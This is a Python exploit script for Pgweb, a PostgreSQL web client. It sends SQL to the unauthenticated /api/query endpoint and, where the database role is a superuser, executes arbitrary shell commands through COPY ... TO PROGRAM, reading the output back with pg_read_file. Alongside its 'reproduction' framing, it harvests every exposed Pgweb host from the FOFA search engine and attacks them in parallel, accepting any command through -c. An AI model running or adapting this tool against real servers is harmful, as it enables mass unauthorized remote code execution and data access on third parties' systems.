#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Reproduce unauthenticated SQL access and conditional OS command execution.

Product: Pgweb (https://github.com/sosedoff/pgweb), a PostgreSQL web client.
Exposure: Pgweb enables HTTP BasicAuth only when both --auth-user and
          --auth-pass are set (pkg/cli/cli.go:202-206). Without that protection,
          an exposed GET /api/query?query=<SQL> endpoint accepts SQL from
          unauthenticated visitors. If the connected PostgreSQL role is a
          superuser, COPY ... TO PROGRAM executes a command as the database
          server process user. pg_read_file can then read the output back.

Usage:
    python Pgweb_Unauth_RCE_repro.py http://127.0.0.1:8081
    python Pgweb_Unauth_RCE_repro.py http://127.0.0.1:8081 -c id
    python Pgweb_Unauth_RCE_repro.py --file targets.txt -c "uname -a" --out rce_result.json
    python Pgweb_Unauth_RCE_repro.py --fofa -c id --out rce_result.json

Probe sequence (up to six requests per host):
    1) GET /api/info                          Identify Pgweb
    2) GET /api/query?query=select ... rolsuper    Check the database role
       For a non-superuser, stop here without executing a command and record
       VULN_UNAUTH.
    3) COPY (SELECT '') TO PROGRAM 'sh -c "<cmd> > /tmp/ncc_rce_out 2>&1"'
    4) SELECT pg_read_file('/tmp/ncc_rce_out')   Read and print actual stdout
    5) COPY (SELECT '') TO PROGRAM 'rm -f /tmp/ncc_rce_out'   Remove output
       in a finally block
    6) SELECT pg_read_file('/tmp/ncc_rce_out')   Verify removal

Operational notes:
    - The default command is `id`. SAFE_CMDS lists read-only examples, but
      -c/--cmd accepts any command; the caller must limit use to authorized
      systems and choose an appropriate command.
    - Command output is written to /tmp/ncc_rce_out. The finally block
      attempts to remove this file and verifies its absence.
    - The script checks rolsuper before the command probe; it skips the
      command on non-superuser connections. It does not check for delegated
      pg_execute_server_program privilege.
    - The default probe does not install a web shell, create a reverse shell,
      read unrelated files, or modify application data.
    - The script makes at most six requests per host; it does not dump or
      export a database.
"""

import argparse
import base64
import json
import re
import ssl
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from pathlib import Path

FOFA_QUERY = 'title="Pgweb" && body="pgweb"'
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE

OUT_PATH = "/tmp/ncc_rce_out"
DEFAULT_CMD = "id"
SAFE_CMDS = ("id", "whoami", "uname -a", "hostname", "pwd", "date")
ROLE_SQL = (
    "select current_user, current_database(), "
    "(select rolsuper from pg_roles where rolname=current_user) as is_superuser, "
    "version()"
)


def _root():
    p = Path(__file__).resolve()
    for parent in p.parents:
        if (parent / "config.yaml").exists():
            return parent
    return p.parents[3]


ROOT = _root()


# ---------------------------------------------------------------- masking

def mask_db(v):
    return str(v or "")


def mask_ip(v):
    return str(v or "")


def mask_version(v):
    return str(v or "").replace("\n", " ")


# ---------------------------------------------------------------- HTTP

def http_get(url, timeout=20):
    req = urllib.request.Request(
        url, headers={"User-Agent": UA, "Connection": "close"}, method="GET")
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=CTX) as r:
            return r.status, r.read(65536).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        try:
            return e.code, e.read(8192).decode("utf-8", "replace")
        except Exception:
            return e.code, ""
    except Exception as e:
        return 0, "%s: %s" % (type(e).__name__, e)


def jload(s):
    try:
        return json.loads(s)
    except Exception:
        return None


def _base(u):
    u = (u or "").strip()
    if not u:
        return u
    if not re.match(r"^https?://", u, re.I):
        u = "http://" + u
    return u.rstrip("/")


def _mk_url(ip, port, host):
    """Normalize a FOFA (ip, port, host) row into a URL."""
    h = (host or "").strip()
    h = re.sub(r"^https?://", "", h, flags=re.I)
    h = h.split("/")[0].split("?")[0]
    if not h or h == str(port):
        h = ip
    if ":" not in h and str(port) not in ("80", "443"):
        h = "%s:%s" % (h, port)
    scheme = "https" if str(port) == "443" else "http"
    return "%s://%s" % (scheme, h)


def _query_url(base, sql):
    return base + "/api/query?" + urllib.parse.urlencode({"query": sql})


def _sql_lit(s):
    """Quote a PostgreSQL string literal by doubling internal single quotes."""
    return "'" + str(s).replace("'", "''") + "'"


def _sh_dq(s):
    """Escape backslashes and quotes for a shell double-quoted string.

    Dollar-sign expansion still occurs, matching the caller's command text.
    """
    return str(s).replace("\\", "\\\\").replace('"', '\\"')


def exec_sql(cmd, path=OUT_PATH):
    """Run cmd on the database host via COPY ... TO PROGRAM; redirect output."""
    # Fixed template: sh -c "<cmd> > /tmp/ncc_rce_out 2>&1"
    prog = 'sh -c "%s > %s 2>&1"' % (_sh_dq(str(cmd).strip()), path)
    return "COPY (SELECT '') TO PROGRAM " + _sql_lit(prog)


def cleanup_sql(path=OUT_PATH):
    return "COPY (SELECT '') TO PROGRAM " + _sql_lit("rm -f " + path)


def read_sql(path=OUT_PATH):
    return "SELECT pg_read_file(" + _sql_lit(path) + ")"


# ---------------------------------------------------------------- FOFA

def load_config():
    p = ROOT / "config.yaml"
    if not p.exists():
        return {"keys": []}
    txt = p.read_text(encoding="utf-8", errors="replace")

    def section(name):
        m = re.search(r"^%s:\s*\n((?:[ \t]+.*\n?)*)" % name, txt, re.M)
        if not m:
            return {}
        mm = re.search(r"^\s+key:\s*[\"']?([^\"'\n#]*)", m.group(1), re.M)
        return {"key": mm.group(1).strip() if mm else ""}

    keys = [s["key"] for s in (section("fofa"), section("fofa_bak1")) if s.get("key")]
    return {"keys": keys}


def fofa_page(q, page, size, key, retries=4):
    qb = base64.b64encode(q.encode()).decode()
    url = ("https://fofa.info/api/v1/search/all?key=%s&qbase64=%s"
           "&fields=ip,port,host,title&size=%d&page=%d" % (key, qb, size, page))
    for i in range(retries):
        st, body = http_get(url, timeout=60)
        j = jload(body) or {}
        if j.get("error"):
            msg = str(j.get("errmsg", ""))
            if any(x in msg for x in ("429", "Too Many", "\u9891\u7387", "\u901f\u5ea6", "\u8fc7\u5feb", "\u9891\u7e41")):
                time.sleep(20 + 10 * i)
                continue
            raise RuntimeError("FOFA error: %s" % msg)
        if st == 200:
            return j
        time.sleep(10 + 5 * i)
    raise RuntimeError("FOFA retries exhausted (page %d)" % page)


def fofa_targets(keys, size=100, max_pages=200):
    """Fetch all available pages and deduplicate by (ip, port)."""
    keys = [keys] if isinstance(keys, str) else list(keys)
    if not keys:
        raise RuntimeError("No FOFA key is configured in config.yaml")
    ki = [0]
    seen, targets, page = set(), [], 1
    while page <= max_pages:
        try:
            j = fofa_page(FOFA_QUERY, page, size, keys[ki[0]])
        except RuntimeError:
            if ki[0] + 1 >= len(keys):
                raise
            ki[0] += 1
            print("[fofa] switch to backup key #%d" % (ki[0] + 1), flush=True)
            j = fofa_page(FOFA_QUERY, page, size, keys[ki[0]])
        batch = j.get("results") or []
        if not batch:
            break
        for row in batch:
            ip, port = row[0], str(row[1])
            host = row[2] if len(row) > 2 else ""
            title = row[3] if len(row) > 3 else ""
            if (ip, port) in seen:
                continue
            seen.add((ip, port))
            targets.append({"url": _mk_url(ip, port, host), "ip": ip,
                            "port": port, "title": title})
        total = int(j.get("size") or 0)
        print("[fofa] page %d: +%d rows, total=%d" % (page, len(batch), total), flush=True)
        if total and page * size >= total:
            break
        page += 1
        time.sleep(4)
    return targets


# ---------------------------------------------------------------- probe

def probe(target, cmd=DEFAULT_CMD):
    cmd = (cmd or DEFAULT_CMD).strip() or DEFAULT_CMD
    base = _base(target["url"])
    res = {"url": base, "ip": target.get("ip"), "port": target.get("port"),
           "requests": 0, "verdict": "UNKNOWN", "pgweb": "", "db_user": "",
           "database": "", "pg_version": "", "is_superuser": None,
           "cmd": cmd, "command_executed": False, "stdout": "",
           "readback": "", "cleaned": None, "probe_path": OUT_PATH,
           "note": "", "steps": []}
    steps = res["steps"]

    def rec(step, sql, st, body):
        steps.append({"step": step, "query": sql, "status": st,
                      "body": (body or "")[:600]})

    # 1) Identify Pgweb.
    st, txt = http_get(base + "/api/info", timeout=12)
    res["requests"] += 1
    info = jload(txt) or {}
    if st == 0:
        res["verdict"] = "UNREACHABLE"
        res["note"] = txt[:160]
        return res
    if st in (401, 403):
        res["verdict"] = "NOT_VULN"
        res["note"] = "auth enabled on /api/info (HTTP %d)" % st
        return res
    app = (info.get("app") or {}) if isinstance(info, dict) else {}
    if st != 200 or not app.get("version"):
        res["verdict"] = "NOT_VULN"
        res["note"] = "not pgweb /api/info (HTTP %d)" % st
        return res
    res["pgweb"] = str(app.get("version"))

    # 2) Check unauthenticated SQL access and the role without running a command.
    st, txt = http_get(_query_url(base, ROLE_SQL), timeout=20)
    res["requests"] += 1
    rec("role_check", ROLE_SQL, st, txt)
    q = jload(txt) or {}
    if st in (401, 403):
        res["verdict"] = "NOT_VULN"
        res["note"] = "query requires auth (HTTP %d)" % st
        return res
    if st != 200 or not q.get("rows"):
        res["verdict"] = "NOT_VULN"
        res["note"] = "anonymous query not usable (HTTP %d)" % st
        return res
    row = q["rows"][0]
    res["db_user"] = str(row[0])
    res["database"] = mask_db(row[1]) if len(row) > 1 else ""
    res["is_superuser"] = bool(row[2]) if len(row) > 2 else None
    res["pg_version"] = mask_version(row[3]) if len(row) > 3 else ""
    res["verdict"] = "VULN_UNAUTH"
    res["note"] = "anonymous SQL execution confirmed"
    print("\n[VULN] %s  pgweb=%s user=%s db=%s superuser=%s" %
          (base, res["pgweb"], res["db_user"], res["database"],
           res["is_superuser"]), flush=True)
    print("       pg=%s" % res["pg_version"], flush=True)

    # This script skips command execution for non-superusers.
    if not res["is_superuser"]:
        res["note"] = ("anonymous SQL confirmed; role is not superuser, "
                       "command execution not attempted")
        print("       role is not superuser -> skip RCE probe", flush=True)
        return res

    # 3-6) Execute, read actual stdout, remove output, and verify removal.
    esql = exec_sql(cmd)
    try:
        st, txt = http_get(_query_url(base, esql), timeout=20)
        res["requests"] += 1
        rec("exec", esql, st, txt)
        res["command_executed"] = (st == 200)
        if st != 200:
            res["note"] = "COPY ... TO PROGRAM rejected (HTTP %d)" % st
            print("       [!] command execution rejected (HTTP %d)" % st, flush=True)
        else:
            rsql = read_sql()
            rst, rtxt = http_get(_query_url(base, rsql), timeout=20)
            res["requests"] += 1
            rec("read_output", rsql, rst, rtxt)
            rows = (jload(rtxt) or {}).get("rows") or []
            if rst == 200 and rows and rows[0]:
                stdout = "" if rows[0][0] is None else str(rows[0][0])
                res["stdout"] = stdout
                res["readback"] = stdout
                res["verdict"] = "RCE"
                res["note"] = ("anonymous COPY ... TO PROGRAM executed `%s` on "
                               "the database host; stdout read back via "
                               "pg_read_file" % cmd)
                print("       [RCE] cmd=%r stdout:" % cmd, flush=True)
                if stdout.strip():
                    for ln in stdout.rstrip("\n").splitlines():
                        print("         | " + ln, flush=True)
                else:
                    print("         | <empty stdout>", flush=True)
            else:
                res["note"] = ("command accepted but stdout not readable "
                               "(HTTP %d)" % rst)
                print("       [!] command accepted, stdout not readable (HTTP %d)"
                      % rst, flush=True)
    finally:
        # Always attempt cleanup, then verify that the output file is absent.
        csql = cleanup_sql()
        cst, ctxt = http_get(_query_url(base, csql), timeout=20)
        res["requests"] += 1
        rec("cleanup", csql, cst, ctxt)

        vsql = read_sql()
        vst, vtxt = http_get(_query_url(base, vsql), timeout=20)
        res["requests"] += 1
        rec("cleanup_verify", vsql, vst, vtxt)
        gone = vst == 400 and ("No such file" in vtxt
                               or "does not exist" in vtxt
                               or "could not open file" in vtxt)
        res["cleaned"] = bool(gone)
        if gone:
            print("       cleaned: %s (verified absent)" % OUT_PATH, flush=True)
        elif cst == 200:
            print("       cleanup sent, absence unverified: %s" % OUT_PATH, flush=True)
        else:
            print("       [!] cleanup failed, check %s" % OUT_PATH, flush=True)

    return res


def run(targets, workers=16, out=None, cmd=DEFAULT_CMD):
    results, done = [], 0
    with ThreadPoolExecutor(max_workers=workers) as ex:
        futs = {ex.submit(probe, t, cmd): t for t in targets}
        for f in as_completed(futs):
            try:
                r = f.result()
            except Exception as e:
                t = futs[f]
                r = {"url": t.get("url"), "ip": t.get("ip"), "port": t.get("port"),
                     "requests": 0, "verdict": "ERROR", "cmd": cmd,
                     "command_executed": False, "stdout": "", "cleaned": None,
                     "note": str(e)[:160], "steps": []}
            results.append(r)
            done += 1
            if done % 50 == 0:
                print("[*] progress %d/%d" % (done, len(targets)), flush=True)
    results.sort(key=lambda x: (x["verdict"] != "RCE", x["url"]))
    rce = [r for r in results if r["verdict"] == "RCE"]
    unauth = [r for r in results if r["verdict"] == "VULN_UNAUTH"]
    print("\n==== Summary: targets %d, unauthenticated SQL %d, RCE %d (cmd=%r) ====" %
          (len(results), len(rce) + len(unauth), len(rce), cmd))
    for r in rce:
        out_line = (r.get("stdout") or "").strip().splitlines()
        print("  [RCE] %s user=%s db=%s cleaned=%s" %
              (r["url"], r["db_user"], r["database"], r["cleaned"]))
        print("        stdout: %s" %
              (out_line[0] if out_line else "<empty>"))
    for r in unauth:
        print("  [SQL] %s user=%s db=%s superuser=%s" %
              (r["url"], r["db_user"], r["database"], r["is_superuser"]))
    if out:
        payload = {"ts": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                   "query": FOFA_QUERY if len(targets) > 1 else "",
                   "cmd": cmd,
                   "total": len(results),
                   "rce": len(rce), "unauth": len(unauth), "results": results}
        Path(out).write_text(json.dumps(payload, ensure_ascii=False, indent=1),
                             encoding="utf-8")
        print("[+] Results written to", out)
    return results


def _line_target(line):
    u = _base(line)
    m = re.match(r"^https?://([^/:]+)(?::(\d+))?", u, re.I)
    return {"url": u, "ip": m.group(1) if m else "",
            "port": (m.group(2) if m and m.group(2) else "")}


def main(argv=None):
    ap = argparse.ArgumentParser(
        description="Pgweb reproduction: unauthenticated SQL -> COPY ... TO "
                    "PROGRAM under a superuser role -> command output readback. "
                    "The default command is id; only the standard library is used.")
    ap.add_argument("url", nargs="?", help="One target, e.g. http://target:8081")
    ap.add_argument("--file", help="Target list, one URL or host:port per line")
    ap.add_argument("--fofa", action="store_true",
                    help='Read a key from config.yaml and enumerate all matches for title="Pgweb" && body="pgweb"')
    ap.add_argument("-c", "--cmd", default=DEFAULT_CMD,
                    help="Command to execute (default: id). Suggested read-only "
                         "commands: %s. Any command can be supplied here" % "/".join(SAFE_CMDS))
    ap.add_argument("--out", help="Write per-host results to this JSON path")
    ap.add_argument("--workers", type=int, default=16)
    args = ap.parse_args(argv)

    if args.fofa:
        targets = fofa_targets(load_config()["keys"])
        print("[fofa] %d distinct targets" % len(targets), flush=True)
    elif args.file:
        lines = Path(args.file).read_text(
            encoding="utf-8", errors="replace").splitlines()
        targets = [_line_target(x) for x in lines
                   if x.strip() and not x.strip().startswith("#")]
    elif args.url:
        targets = [_line_target(args.url)]
    else:
        ap.print_help()
        return 2
    run(targets, workers=args.workers, out=args.out, cmd=args.cmd)
    return 0


if __name__ == "__main__":
    sys.exit(main())
